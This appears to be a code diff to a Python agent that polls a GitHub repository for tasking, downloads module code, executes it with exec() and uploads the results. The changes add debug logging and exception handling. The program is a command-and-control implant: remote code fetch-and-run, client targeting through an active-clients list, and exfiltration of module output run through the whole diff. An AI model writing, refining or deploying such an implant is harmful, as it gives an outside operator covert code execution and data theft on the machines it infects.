@@ -49,7 +49,12 @@ class GitHubConnector:
     
     def get_config(self):
         content = self.get_file("config/config.json")
-        return json.loads(content) if content else None
+        if not content:
+            return None
+        try:
+            return json.loads(content)
+        except:
+            return None
 
 
 class ModuleLoader:
@@ -61,31 +66,33 @@ class ModuleLoader:
     def load_module(self, name):
         if name in self.cache:
             return self.cache[name]
-        
-        # Try local
+
         try:
             if os.path.exists(f"modules/{name}.py"):
+                print(f"[Loader] Loading {name} from local filesystem")
                 spec = importlib.util.spec_from_file_location(name, f"modules/{name}.py")
                 if spec and spec.loader:
                     module = importlib.util.module_from_spec(spec)
                     spec.loader.exec_module(module)
                     self.cache[name] = module
                     return module
-        except:
-            pass
-        
-        # Try GitHub
+        except Exception as e:
+            print(f"[Loader] Failed to load {name} locally: {e}")
+
         try:
+            print(f"[Loader] Loading {name} from GitHub...")
             code = self.github.get_file(f"modules/{name}.py")
             if code:
                 spec = importlib.util.spec_from_loader(name, loader=None)
                 module = importlib.util.module_from_spec(spec)
                 exec(code, module.__dict__)
                 self.cache[name] = module
+                print(f"[Loader] Loaded {name} from GitHub")
                 return module
-        except:
-            pass
+        except Exception as e:
+            print(f"[Loader] Failed to load {name} from GitHub: {e}")
         
+        print(f"[Loader] Module {name} not found")
         return None
     
     def execute(self, name, config):
@@ -115,34 +122,49 @@ class Agent:
         return self.github.upload_file(filename, content)
     
     def run(self):
+        print(f"[Agent] Started - Client ID: {self.client_id}")
         while True:
             try:
+                print("[Agent] Fetching config from GitHub...")
                 config = self.github.get_config()
                 if not config:
+                    print("[Agent] No config found, waiting...")
                     time.sleep(self.poll_interval())
                     continue
                 
                 active = config.get("active_clients", [])
                 if active and self.client_id not in active:
+                    print(f"[Agent] Client {self.client_id} not in active list, waiting...")
                     time.sleep(self.poll_interval())
                     continue
                 
                 modules = config.get("modules", [])
                 if not modules:
+                    print("[Agent] No modules to execute, waiting...")
                     time.sleep(self.poll_interval())
                     continue
                 
+                print(f"[Agent] Found {len(modules)} module(s) to execute")
                 for m in modules:
                     name = m.get("name")
                     if name:
+                        print(f"[Agent] Executing module: {name}")
                         result = self.loader.execute(name, m)
                         if result:
-                            self.upload_result(name, result)
+                            print(f"[Agent] Module {name} completed")
+                            if self.upload_result(name, result):
+                                print(f"[Agent] Results uploaded for {name}")
+                            else:
+                                print(f"[Agent] Failed to upload results for {name}")
                 
-                time.sleep(self.poll_interval())
+                sleep_time = self.poll_interval()
+                print(f"[Agent] Waiting {sleep_time:.1f}s before next poll...")
+                time.sleep(sleep_time)
             except KeyboardInterrupt:
+                print("\n[Agent] Stopped by user")
                 break
-            except:
+            except Exception as e:
+                print(f"[Agent] Error: {e}")
                 time.sleep(self.poll_interval())
 
 
